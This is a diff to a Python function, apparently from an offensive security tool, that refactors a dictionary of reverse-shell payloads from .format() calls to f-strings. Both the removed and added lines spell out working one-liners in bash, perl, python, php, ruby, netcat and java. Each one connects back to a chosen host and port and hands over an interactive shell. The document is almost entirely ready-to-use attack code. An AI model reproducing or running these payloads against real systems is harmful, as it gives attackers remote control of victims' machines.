@@ -54,14 +54,14 @@ def console():
 
 def getshell(host, port, pl, shell):
     reverseShells = {
-        'bash':   'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(host, port),
-        'perl':   "perl -e 'use Socket;$i="+'"{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{3} -i");}};{2}'.format(host, port, "'", shell),
-        'python': "python -c '"+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{3}","-i"]);{2}'.format(host, port, "'", shell),
-        'php'   : "php -r '"+'$sock=fsockopen("{0}",{1});exec("{3} -i <&3 >&3 2>&3");{2}'.format(host, port, "'", shell),
-        'ruby':   "ruby -rsocket -e'"+'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("{3} -i <&%d >&%d 2>&%d",f,f,f){2}'.format(host, port, "'", shell),
-        'nc1':    "nc -e {2} {0} {1}".format(host, port,shell),
-        'nc2':    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{2} -i 2>&1|nc {0} {1} >/tmp/f".format(host, port,shell),
-        'java':   'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()'.format(host, port)
+        'bash':   f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
+        'perl':   "perl -e 'use Socket;$i="+f'"{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");}};\'',
+        'python': "python -c '"+f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{shell}","-i"]);\'',
+        'php'   : "php -r '"+f'$sock=fsockopen("{host}",{port});exec("{shell} -i <&3 >&3 2>&3");\'',
+        'ruby':   "ruby -rsocket -e'"+f'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)\'',
+        'nc1':    f'nc -e {shell} {host} {port}',
+        'nc2':    f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f',
+        'java':   f'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()'
     }
     return reverseShells[pl]
 
